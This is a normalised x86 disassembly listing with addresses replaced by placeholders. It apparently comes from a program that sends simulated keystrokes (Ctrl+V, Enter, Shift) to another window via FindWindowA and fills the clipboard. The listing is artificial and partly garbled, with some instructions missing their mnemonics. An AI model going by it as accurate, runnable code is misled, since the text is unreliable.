mov edx [ rw-data ]
push 0x0
push 0x11
push 0x100
mov eax [ edx + 0x1c ]
push eax
call ebx
mov ecx [ rw-data ]
push 0x0
push 0x56
push 0x100
mov edx [ ecx + 0x1c ]
push edx
call ebx
mov eax [ rw-data ]
push 0x0
push 0x56
push 0x101
mov ecx [ eax + 0x1c ]
push ecx
call ebx
mov edx [ rw-data ]
push 0x0
push 0x11
push 0x101
mov eax [ edx + 0x1c ]
push eax
call ebx
mov ecx [ rw-data ]
push 0x0
push 0xd
push 0x100
mov edx [ ecx + 0x1c ]
push edx
call ebx
mov eax [ rw-data ]
push 0x0
push 0xd
push 0x101
mov ecx [ eax + 0x1c ]
push ecx
call ebx
mov ecx [ rw-data ]
mov eax [ ecx - 0x8 ]
mov ecx rw-data
push eax
call sub_422745
mov esi eax
or ecx 0xffffffff
mov edi esi
xor eax eax
[ edi ]
not ecx
push ecx
push 0x2
call [ GlobalAlloc@IAT ]
mov ebp eax
push ebp
call [ GlobalLock@IAT ]
mov edx eax
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
push ebp
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
call [ GlobalUnlock@IAT ]
call [ EmptyClipboard@IAT ]
push ebp
push 0x1
call [ SetClipboardData@IAT ]
call [ CloseClipboard@IAT ]
call ebx
call esi
mov edx [ rw-data ]
push 0x0
push 0x5a
push 0x100
mov eax [ edx + 0x1c ]
push eax
call esi
mov ecx [ rw-data ]
push 0x0
push 0x5a
push 0x101
mov edx [ ecx + 0x1c ]
push edx
call esi
mov eax [ rw-data ]
push 0x0
push 0x10
push 0x101
mov ecx [ eax + 0x1c ]
push ecx
call esi
mov eax [ rw-data ]
mov edx [ rw-data ]
push 0x0
push edx
mov ecx [ eax + 0x1c ]
push 0x100
push ecx
call esi
mov eax [ rw-data ]
mov edx [ rw-data ]
push 0x0
push edx
mov ecx [ eax + 0x1c ]
push 0x101
push ecx
call esi
mov [ rw-data ] 0x1
mov [ rw-data ] 0x0
pop esi
mov ecx [ esp + 0x1c ]
mov [ fs : 0x0 ] ecx
add esp 0x28
retn 0x14
call esi
mov edx [ rw-data ]
push 0x0
push 0x5a
push 0x100
mov eax [ edx + 0x1c ]
push eax
call esi
mov ecx [ rw-data ]
push 0x0
push 0x5a
push 0x101
mov edx [ ecx + 0x1c ]
push edx
call esi
mov eax [ rw-data ]
push 0x0
push 0x10
push 0x101
mov ecx [ eax + 0x1c ]
push ecx
call esi
mov edx [ rw-data ]
push 0x0
push 0x10
push 0x100
mov eax [ edx + 0x1c ]
push eax
call esi
mov ecx [ rw-data ]
mov edx [ rw-data ]
neg ecx
mov eax [ edx + 0x1c ]
push 0x0
push ecx
push 0x100
push eax
call esi
mov ecx [ rw-data ]
mov edx [ rw-data ]
neg ecx
mov eax [ edx + 0x1c ]
push 0x0
push ecx
push 0x101
push eax
call esi
mov ecx [ rw-data ]
push 0x0
push 0x10
push 0x101
mov edx [ ecx + 0x1c ]
push edx
call esi
mov [ rw-data ] 0x1
mov [ rw-data ] 0x0
pop esi
mov ecx [ esp + 0x1c ]
mov [ fs : 0x0 ] ecx
add esp 0x28
retn 0x14
cmp [ rw-data ] 0x32
jne r-xdata
call [ EmptyClipboard@IAT ]
mov eax [ rw-data ]
push eax
call [ OpenClipboard@IAT ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x3c
jne r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
push 0x0
push ecx
mov eax [ edx + 0x1c ]
push 0x100
push eax
call ebx
mov edx [ rw-data ]
mov ecx [ rw-data ]
push 0x0
push ecx
mov eax [ edx + 0x1c ]
push 0x101
push eax
call ebx
mov ecx [ rw-data ]
push 0x0
push 0x10
push 0x100
mov edx [ ecx + 0x1c ]
push edx
call ebx
mov eax [ rw-data ]
push 0x0
push 0x5a
push 0x100
mov ecx [ eax + 0x1c ]
push ecx
call ebx
mov edx [ rw-data ]
push 0x0
push 0x5a
push 0x101
mov eax [ edx + 0x1c ]
push eax
call ebx
mov ecx [ rw-data ]
push 0x0
push 0x10
push 0x101
mov edx [ ecx + 0x1c ]
push edx
call ebx
mov eax [ rw-data ]
push 0x0
test eax eax
jg r-xdata
mov ecx [ rw-data ]
mov eax [ ecx - 0x8 ]
mov ecx rw-data
push eax
call sub_422745
mov esi eax
or ecx 0xffffffff
mov edi esi
xor eax eax
[ edi ]
not ecx
push ecx
push 0x2
call [ GlobalAlloc@IAT ]
mov ebp eax
push ebp
call [ GlobalLock@IAT ]
mov edx eax
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
push ebp
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
call [ GlobalUnlock@IAT ]
call [ EmptyClipboard@IAT ]
push ebp
push 0x1
call [ SetClipboardData@IAT ]
call [ CloseClipboard@IAT ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
inc ecx
push rw-data
lea edx [ eax * 8 ]
mov [ rw-data ] ecx
sub edx eax
mov eax [ rw-data ]
lea esi [ edx * 4 + rw-data ]
mov [ esi ] eax
mov ecx [ rw-data ]
mov [ esi + 0x4 ] ecx
mov edx [ rw-data ]
mov [ esi + 0x8 ] edx
mov eax [ rw-data ]
lea ecx [ esi + 0x10 ]
mov [ esi + 0xc ] eax
call sub_4225b1
mov ecx [ rw-data ]
mov [ esi + 0x14 ] ecx
mov edx [ rw-data ]
mov [ esi + 0x18 ] edx
mov eax [ rw-data ]
inc eax
mov ecx 0x186a0
cdq
idiv ecx
mov esi edx
mov edx [ rw-data ]
mov [ rw-data ] esi
lea eax [ edx + 0x1 ]
cdq
idiv ecx
mov ecx edx
cmp esi ecx
mov [ rw-data ] ecx
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov edx [ rw-data ]
push eax
push 0x100
mov eax [ edx + 0x1c ]
push eax
call ebx
mov edx [ rw-data ]
mov ecx [ rw-data ]
push 0x0
push ecx
mov eax [ edx + 0x1c ]
push 0x101
push eax
mov eax [ rw-data ]
push 0x10
push 0x100
mov ecx [ eax + 0x1c ]
push ecx
call ebx
mov eax [ rw-data ]
mov edx [ rw-data ]
neg eax
push 0x0
push eax
mov eax [ edx + 0x1c ]
push 0x100
push eax
call ebx
mov eax [ rw-data ]
mov ecx [ rw-data ]
neg eax
mov edx [ ecx + 0x1c ]
push 0x0
push eax
push 0x101
push edx
call ebx
mov eax [ rw-data ]
push 0x0
push 0x10
push 0x101
mov ecx [ eax + 0x1c ]
push ecx
jmp r-xdata
mov edx [ rw-data ]
pop edi
pop ebp
cmp edx ecx
pop ebx
je r-xdata
lea eax [ esi + 0x1 ]
mov edi 0x186a0
cdq
idiv edi
mov ebp edx
mov ebx ebp
cmp ebx ecx
je r-xdata
mov ecx [ rw-data ]
push 0x0
push 0x55
push 0x100
mov edx [ ecx + 0x1c ]
push edx
call ebx
mov eax [ rw-data ]
push 0x0
push 0x55
push 0x101
mov ecx [ eax + 0x1c ]
push ecx
call ebx
mov eax [ rw-data ]
mov edx [ rw-data ]
push 0x0
push edx
mov ecx [ eax + 0x1c ]
push 0x100
push ecx
call ebx
mov eax [ rw-data ]
mov edx [ rw-data ]
push 0x0
push edx
mov ecx [ eax + 0x1c ]
push 0x101
push ecx
call ebx
mov eax [ rw-data ]
dec eax
test eax eax
mov [ rw-data ] eax
jg r-xdata
call ebx
mov ecx [ rw-data ]
push 0x0
push 0x11
push 0x100
mov edx [ ecx + 0x1c ]
push edx
call ebx
mov eax [ rw-data ]
push 0x0
push 0x56
push 0x100
mov ecx [ eax + 0x1c ]
push ecx
call ebx
mov edx [ rw-data ]
push 0x0
push 0x11
push 0x101
mov eax [ edx + 0x1c ]
push eax
call ebx
mov ecx [ rw-data ]
push 0x0
push 0x56
push 0x101
mov edx [ ecx + 0x1c ]
push edx
call ebx
mov eax [ rw-data ]
push 0x0
push 0xd
push 0x100
mov ecx [ eax + 0x1c ]
push ecx
call ebx
mov edx [ rw-data ]
push 0x0
push 0xd
push 0x101
mov eax [ edx + 0x1c ]
push eax
call ebx
mov esi ebp
cmp esi ecx
jne r-xdata
lea edi [ esi * 8 ]
sub edi esi
shl edi 0x2
mov ecx [ rw-data ]
mov eax [ rw-data ]
inc ecx
cmp ecx eax
mov [ rw-data ] ecx
jne r-xdata
jmp r-xdata
lea eax [ ebx + 0x1 ]
mov esi 0x186a0
cdq
idiv esi
mov ebx edx
cmp ebx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ esp + 0x20 ] eax
mov ecx [ edi + rw-data ]
mov edx [ edi + rw-data ]
mov eax [ edi + rw-data ]
mov [ esp + 0x10 ] ecx
mov ecx [ edi + rw-data ]
mov [ esp + 0x14 ] edx
lea edx [ edi + rw-data ]
mov [ esp + 0x1c ] ecx
push edx
lea ecx [ esp + 0x24 ]
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x1c ] eax
call sub_4225b1
mov eax [ edi + rw-data ]
mov edx [ esi + rw-data ]
mov ecx [ edi + rw-data ]
mov [ esp + 0x24 ] eax
mov [ edi + rw-data ] edx
mov eax [ esi + rw-data ]
mov [ esp + 0x28 ] ecx
mov [ edi + rw-data ] eax
mov ecx [ esi + rw-data ]
lea eax [ esi + rw-data ]
mov [ edi + rw-data ] ecx
mov edx [ esi + rw-data ]
push eax
lea ecx [ edi + rw-data ]
mov [ edi + rw-data ] edx
call sub_4225b1
mov ecx [ esi + rw-data ]
mov eax [ esp + 0x10 ]
mov [ edi + rw-data ] ecx
mov edx [ esi + rw-data ]
mov ecx [ esp + 0x14 ]
mov [ edi + rw-data ] edx
mov edx [ esp + 0x18 ]
mov [ esi + rw-data ] ecx
lea ecx [ esp + 0x20 ]
mov [ esi + rw-data ] eax
mov eax [ esp + 0x1c ]
push ecx
lea ecx [ esi + rw-data ]
mov [ esi + rw-data ] edx
mov [ esi + rw-data ] eax
call sub_4225b1
lea ecx [ esp + 0x20 ]
mov [ esp + 0x34 ] 0xffffffff
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
mov [ esi + rw-data ] edx
mov [ esi + rw-data ] eax
call sub_422478
mov ecx [ rw-data ]
lea eax [ ecx * 8 ]
sub eax ecx
shl eax 0x2
mov edx [ eax + rw-data ]
mov eax [ eax + rw-data ]
mov [ rw-data ] edx
mov [ rw-data ] eax
mov [ rw-data ] 0x1
mov edx [ edi + rw-data ]
lea esi [ ebx * 8 ]
sub esi ebx
shl esi 0x2
cmp edx [ esi + rw-data ]
jle r-xdata
sub_4031a0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_42a52d
push eax
mov eax [ rw-data ]
mov [ fs : 0x0 ] esp
sub esp 0x90
push esi
push edi
xor edi edi
mov esi ecx
cmp eax edi
jne r-xdata
mov eax [ rw-data ]
push ebx
push ebp
mov [ esp + 0x20 ] eax
mov [ esp + 0xa8 ] edi
mov [ esp + 0x1c ] eax
mov [ esp + 0x50 ] eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x40 ] eax
mov [ esp + 0x6c ] eax
mov [ esp + 0x64 ] eax
mov [ esp + 0x34 ] eax
mov bl 0x7
mov [ rw-data ] edi
mov [ esp + 0xa8 ] bl
mov [ rw-data ] edi
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
cmp eax edi
mov [ esp + 0x24 ] 0xa
je r-xdata
push rw-data
push edi
call [ FindWindowA@IAT ]
push eax
call sub_41f3e7
cmp eax edi
mov [ rw-data ] eax
jne r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
test eax eax
je r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ esp + 0x2c ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ esp + 0x28 ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
cmp eax 0x61
jl r-xdata
push edi
push rw-data
push rw-data
mov ecx esi
call sub_420904
pop edi
pop esi
mov ecx [ esp + 0x90 ]
mov [ fs : 0x0 ] ecx
add esp 0x9c
retn
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
test eax eax
je r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ esp + 0x2c ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ esp + 0x28 ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
cmp eax 0x61
jl r-xdata
neg eax
sub eax 0x20
jmp r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
test eax eax
je r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ esp + 0x2c ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ esp + 0x28 ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
cmp eax 0x61
jl r-xdata
neg eax
sub eax 0x20
jmp r-xdata
mov [ esp + 0x30 ] eax
mov eax [ rw-data ]
mov edx [ esp + 0x24 ]
lea ecx [ eax * 8 ]
sub ecx eax
lea esi [ ecx * 4 + rw-data ]
mov [ esi ] edx
mov eax [ esp + 0x28 ]
mov [ esi + 0x4 ] eax
mov ecx [ esp + 0x2c ]
mov [ esi + 0x8 ] ecx
mov edx [ esp + 0x30 ]
lea eax [ esp + 0x34 ]
lea ecx [ esi + 0x10 ]
push eax
mov [ esi + 0xc ] edx
call sub_4225b1
mov ecx [ esp + 0x38 ]
mov [ esi + 0x14 ] ecx
mov edx [ esp + 0x3c ]
mov [ esi + 0x18 ] edx
mov eax [ rw-data ]
inc eax
mov ecx 0x186a0
cdq
idiv ecx
mov [ rw-data ] edx
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
cmp eax edi
mov [ esp + 0x24 ] 0xa
je r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ esp + 0x2c ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ esp + 0x28 ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
cmp eax 0x61
jl r-xdata
neg eax
sub eax 0x20
jmp r-xdata
mov [ esp + 0x30 ] eax
mov eax [ rw-data ]
lea edx [ eax * 8 ]
sub edx eax
mov eax [ esp + 0x24 ]
lea esi [ edx * 4 + rw-data ]
mov [ esi ] eax
mov ecx [ esp + 0x28 ]
mov [ esi + 0x4 ] ecx
mov edx [ esp + 0x2c ]
lea ecx [ esp + 0x34 ]
mov [ esi + 0x8 ] edx
mov eax [ esp + 0x30 ]
push ecx
lea ecx [ esi + 0x10 ]
mov [ esi + 0xc ] eax
call sub_4225b1
mov edx [ esp + 0x38 ]
mov [ esi + 0x14 ] edx
mov eax [ esp + 0x3c ]
mov [ esi + 0x18 ] eax
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
mov ecx 0x186a0
cdq
idiv ecx
mov [ rw-data ] edx
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
test eax eax
je r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov ecx eax
xor eax eax
test ecx ecx
mov [ esp + 0x44 ] ecx
jle r-xdata
neg eax
sub eax 0x20
jmp r-xdata
mov [ esp + 0x30 ] eax
mov eax [ rw-data ]
lea edx [ eax * 8 ]
sub edx eax
mov eax [ esp + 0x24 ]
lea esi [ edx * 4 + rw-data ]
mov [ esi ] eax
mov ecx [ esp + 0x28 ]
mov [ esi + 0x4 ] ecx
mov edx [ esp + 0x2c ]
lea ecx [ esp + 0x34 ]
mov [ esi + 0x8 ] edx
mov eax [ esp + 0x30 ]
push ecx
lea ecx [ esi + 0x10 ]
mov [ esi + 0xc ] eax
call sub_4225b1
mov edx [ esp + 0x38 ]
mov [ esi + 0x14 ] edx
mov eax [ esp + 0x3c ]
mov [ esi + 0x18 ] eax
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
mov ecx 0x186a0
cdq
idiv ecx
mov [ rw-data ] edx
mov ecx [ rw-data ]
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov ebp 0x1
mov [ esp + 0x58 ] eax
cmp eax ebp
jl r-xdata
lea ebp [ eax + 0x1 ]
lea edx [ esp + 0x50 ]
push ebp
push rw-data
push edx
call sub_41dba7
add esp 0xc
call sub_4272f7
mov ecx [ esp + 0x50 ]
mov eax [ eax + 0x4 ]
push 0x0
push ecx
lea edx [ esp + 0x20 ]
push rw-data
push edx
mov ecx eax
call sub_426e5d
push eax
lea ecx [ esp + 0x18 ]
mov [ esp + 0xac ] 0x8
call sub_4225b1
lea ecx [ esp + 0x18 ]
mov [ esp + 0xa8 ] bl
call sub_422478
mov ecx [ esp + 0x14 ]
mov al [ ecx + 0xb ]
cmp al 0x61
jl r-xdata
mov [ esp + 0x30 ] eax
mov eax [ rw-data ]
lea edx [ eax * 8 ]
sub edx eax
mov eax [ esp + 0x24 ]
lea esi [ edx * 4 + rw-data ]
mov [ esi ] eax
mov ecx [ esp + 0x28 ]
mov [ esi + 0x4 ] ecx
mov edx [ esp + 0x2c ]
lea ecx [ esp + 0x34 ]
mov [ esi + 0x8 ] edx
mov eax [ esp + 0x30 ]
push ecx
lea ecx [ esi + 0x10 ]
mov [ esi + 0xc ] eax
call sub_4225b1
mov edx [ esp + 0x38 ]
mov [ esi + 0x14 ] edx
mov eax [ esp + 0x3c ]
mov [ esi + 0x18 ] eax
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
mov ecx 0x186a0
cdq
idiv ecx
mov [ rw-data ] edx
xor edi edi
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
test eax eax
mov [ esp + 0x24 ] 0x28
je r-xdata
lea eax [ edx * 8 ]
sub eax edx
shl eax 0x2
mov esi [ eax + rw-data ]
cmp esi 0x14
je r-xdata
push ebp
lea edx [ esp + 0x54 ]
push rw-data
push edx
call sub_41dba7
add esp 0xc
call sub_4272f7
mov ecx [ esp + 0x50 ]
mov eax [ eax + 0x4 ]
push 0x0
push ecx
lea edx [ esp + 0x20 ]
push rw-data
push edx
mov ecx eax
call sub_426e5d
push eax
lea ecx [ esp + 0x24 ]
mov [ esp + 0xac ] 0xa
call sub_4225b1
lea ecx [ esp + 0x18 ]
mov [ esp + 0xa8 ] bl
call sub_422478
mov eax [ esp + 0x20 ]
cmp [ eax ] 0x23
jne r-xdata
movsx edx al
neg edx
mov [ esp + 0x30 ] edx
movsx eax al
sub eax 0x20
mov [ esp + 0x30 ] eax
jmp r-xdata
mov ecx [ rw-data ]
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
cmp eax 0x61
jl r-xdata
mov [ eax + rw-data ] edi
cmp esi 0x1e
jne r-xdata
push 0x0
mov [ esp + 0x28 ] 0x14
mov esi [ eax - 0x8 ]
push rw-data
lea ecx [ esp + 0x28 ]
call sub_41d82f
sub esi eax
lea edx [ esp + 0x68 ]
sub esi 0x8
lea ecx [ esp + 0x20 ]
push esi
push edx
call sub_41d73b
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0xac ] 0xe
call sub_4225b1
lea ecx [ esp + 0x68 ]
mov [ esp + 0xa8 ] bl
call sub_422478
mov eax [ esp + 0x1c ]
lea ecx [ esp + 0x48 ]
mov eax [ eax - 0x8 ]
add eax 0xfffffffd
push eax
push ecx
lea ecx [ esp + 0x24 ]
call sub_41d7b7
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0xac ] 0xf
call sub_4225b1
lea ecx [ esp + 0x48 ]
mov [ esp + 0xa8 ] bl
call sub_422478
mov edx [ esp + 0x1c ]
push edx
call sub_410877
add esp 0x4
lea ecx [ esp + 0x20 ]
add edi eax
push 0x0
push rw-data
call sub_41d82f
push eax
lea eax [ esp + 0x60 ]
push eax
lea ecx [ esp + 0x28 ]
call sub_41d7b7
push eax
lea ecx [ esp + 0x24 ]
mov [ esp + 0xac ] 0x10
call sub_4225b1
lea ecx [ esp + 0x5c ]
mov [ esp + 0xa8 ] bl
call sub_422478
lea ecx [ esp + 0x20 ]
push ecx
lea ecx [ esp + 0x38 ]
call sub_4225b1
mov [ esp + 0x28 ] edi
cmp [ eax + 0x2 ] 0x53
jne r-xdata
mov esi [ ecx - 0x8 ]
push 0x0
push rw-data
lea ecx [ esp + 0x1c ]
call sub_41d82f
sub esi eax
lea eax [ esp + 0x4c ]
sub esi 0x9
lea ecx [ esp + 0x14 ]
push esi
push eax
call sub_41d73b
push eax
lea ecx [ esp + 0x18 ]
mov [ esp + 0xac ] 0x9
call sub_4225b1
lea ecx [ esp + 0x4c ]
mov [ esp + 0xa8 ] bl
call sub_422478
mov ecx [ esp + 0x14 ]
push ecx
call sub_410877
mov [ esp + 0x30 ] eax
mov [ esp + 0x2c ] eax
mov eax [ rw-data ]
add esp 0x4
lea edx [ eax * 8 ]
sub edx eax
mov eax [ esp + 0x24 ]
lea esi [ edx * 4 + rw-data ]
mov [ esi ] eax
mov ecx [ esp + 0x28 ]
mov [ esi + 0x4 ] ecx
mov edx [ esp + 0x2c ]
lea ecx [ esp + 0x34 ]
mov [ esi + 0x8 ] edx
mov eax [ esp + 0x30 ]
push ecx
lea ecx [ esi + 0x10 ]
mov [ esi + 0xc ] eax
call sub_4225b1
mov edx [ esp + 0x38 ]
mov [ esi + 0x14 ] edx
mov eax [ esp + 0x3c ]
mov [ esi + 0x18 ] eax
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
mov ecx 0x186a0
cdq
idiv ecx
mov ecx [ esp + 0x44 ]
mov eax ebp
cmp eax ecx
mov [ rw-data ] edx
jl r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
test eax eax
mov [ esp + 0x24 ] 0x32
je r-xdata
mov esi 0x28
neg eax
sub eax 0x20
jmp r-xdata
lea eax [ edx + 0x1 ]
mov esi 0x186a0
cdq
idiv esi
cmp edx ecx
jne r-xdata
jmp r-xdata
mov [ esp + 0x24 ] 0x1e
mov eax [ eax - 0x8 ]
add eax 0xffffffee
lea ecx [ esp + 0x20 ]
push eax
lea eax [ esp + 0x50 ]
push eax
call sub_41d73b
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0xac ] 0xb
call sub_4225b1
lea ecx [ esp + 0x4c ]
mov [ esp + 0xa8 ] bl
call sub_422478
mov ecx [ esp + 0x1c ]
lea edx [ esp + 0x44 ]
mov eax [ ecx - 0x8 ]
lea ecx [ esp + 0x1c ]
add eax 0xfffffffd
push eax
push edx
call sub_41d7b7
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0xac ] 0xc
call sub_4225b1
lea ecx [ esp + 0x44 ]
mov [ esp + 0xa8 ] bl
call sub_422478
mov eax [ esp + 0x1c ]
lea ecx [ esp + 0x60 ]
mov eax [ eax - 0x8 ]
add eax 0xfffffff7
push eax
push ecx
lea ecx [ esp + 0x24 ]
call sub_41d73b
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0xac ] 0xd
call sub_4225b1
lea ecx [ esp + 0x60 ]
mov [ esp + 0xa8 ] bl
call sub_422478
mov edx [ esp + 0x1c ]
push edx
call sub_410877
add edi eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x2c ] edi
add esp 0x4
movsx ecx [ eax + 0xd ]
add ecx 0x30
mov [ esp + 0x38 ] ecx
jmp r-xdata
mov ecx [ rw-data ]
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
xor edi edi
xor edx edx
test eax eax
mov [ esp + 0x54 ] eax
jle r-xdata
lea eax [ edx + 0x1 ]
mov ebp 0x186a0
cdq
idiv ebp
cmp edx ecx
jne r-xdata
mov [ eax + rw-data ] edi
push ebp
lea edx [ esp + 0x54 ]
push rw-data
push edx
call sub_41dba7
add esp 0xc
call sub_4272f7
mov ecx [ esp + 0x50 ]
mov eax [ eax + 0x4 ]
push 0x0
push ecx
lea edx [ esp + 0x64 ]
push rw-data
push edx
mov ecx eax
call sub_426e5d
push eax
lea ecx [ esp + 0x24 ]
mov [ esp + 0xac ] 0x11
call sub_4225b1
lea ecx [ esp + 0x5c ]
mov [ esp + 0xa8 ] bl
call sub_422478
mov eax [ esp + 0x20 ]
push 0x0
push rw-data
lea ecx [ esp + 0x28 ]
mov esi [ eax - 0x8 ]
call sub_41d82f
sub esi eax
lea ecx [ esp + 0x18 ]
sub esi 0x8
push esi
push ecx
lea ecx [ esp + 0x28 ]
call sub_41d73b
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0xac ] 0x12
call sub_4225b1
lea ecx [ esp + 0x18 ]
mov [ esp + 0xa8 ] bl
call sub_422478
mov edx [ esp + 0x1c ]
lea ecx [ esp + 0x1c ]
mov eax [ edx - 0x8 ]
add eax 0xfffffffd
push eax
lea eax [ esp + 0x50 ]
push eax
call sub_41d7b7
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0xac ] 0x13
call sub_4225b1
lea ecx [ esp + 0x4c ]
mov [ esp + 0xa8 ] bl
call sub_422478
mov ecx [ esp + 0x1c ]
push ecx
call sub_410877
add esp 0x4
lea ecx [ esp + 0x20 ]
add edi eax
push 0x0
push rw-data
call sub_41d82f
lea edx [ esp + 0x44 ]
push eax
push edx
lea ecx [ esp + 0x28 ]
call sub_41d7b7
push eax
lea ecx [ esp + 0x24 ]
mov [ esp + 0xac ] 0x14
call sub_4225b1
mov [ esp + 0xa8 ] bl
lea ecx [ esp + 0x44 ]
call sub_422478
lea eax [ esp + 0x20 ]
lea ecx [ esp + 0x34 ]
push eax
call sub_4225b1
mov eax [ rw-data ]
mov ecx [ esp + 0x48 ]
mov [ esp + 0x28 ] edi
mov [ esp + 0x30 ] ecx
lea edx [ eax * 8 ]
sub edx eax
mov eax [ esp + 0x24 ]
lea esi [ edx * 4 + rw-data ]
mov [ esi ] eax
mov ecx [ esp + 0x28 ]
mov [ esi + 0x4 ] ecx
mov edx [ esp + 0x2c ]
lea ecx [ esp + 0x34 ]
mov [ esi + 0x8 ] edx
mov eax [ esp + 0x30 ]
push ecx
lea ecx [ esi + 0x10 ]
mov [ esi + 0xc ] eax
call sub_4225b1
mov edx [ esp + 0x38 ]
mov [ esi + 0x14 ] edx
mov eax [ esp + 0x3c ]
mov [ esi + 0x18 ] eax
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
mov ecx 0x186a0
cdq
idiv ecx
mov eax [ esp + 0x58 ]
inc ebp
cmp ebp eax
mov ecx edx
mov [ rw-data ] ecx
jle r-xdata
mov [ esp + 0x48 ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov ebp 0x1
mov [ esp + 0x58 ] eax
cmp eax ebp
jl r-xdata
mov edx [ rw-data ]
cmp edx ecx
je r-xdata
mov eax [ rw-data ]
lea edx [ eax * 8 ]
sub edx eax
mov eax [ esp + 0x24 ]
lea esi [ edx * 4 + rw-data ]
mov [ esi ] eax
mov ecx [ esp + 0x28 ]
mov [ esi + 0x4 ] ecx
mov edx [ esp + 0x2c ]
lea ecx [ esp + 0x34 ]
mov [ esi + 0x8 ] edx
mov eax [ esp + 0x30 ]
push ecx
lea ecx [ esi + 0x10 ]
mov [ esi + 0xc ] eax
call sub_4225b1
mov edx [ esp + 0x38 ]
mov [ esi + 0x14 ] edx
mov eax [ esp + 0x3c ]
mov [ esi + 0x18 ] eax
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
mov ecx 0x186a0
cdq
idiv ecx
mov eax [ esp + 0x58 ]
inc ebp
cmp ebp eax
mov ecx edx
mov [ rw-data ] ecx
jle r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
test eax eax
mov [ esp + 0x24 ] 0x3c
mov ebp 0x64
je r-xdata
lea eax [ edx * 8 ]
sub eax edx
shl eax 0x2
cmp [ eax + rw-data ] 0x32
jne r-xdata
lea eax [ edx + 0x1 ]
lea edx [ esp + 0x50 ]
push eax
push rw-data
push edx
mov [ esp + 0x64 ] eax
call sub_41dba7
add esp 0xc
call sub_4272f7
mov ecx [ esp + 0x50 ]
mov eax [ eax + 0x4 ]
push 0x0
push ecx
lea edx [ esp + 0x64 ]
push rw-data
push edx
mov ecx eax
call sub_426e5d
push eax
lea ecx [ esp + 0x18 ]
mov [ esp + 0xac ] 0x15
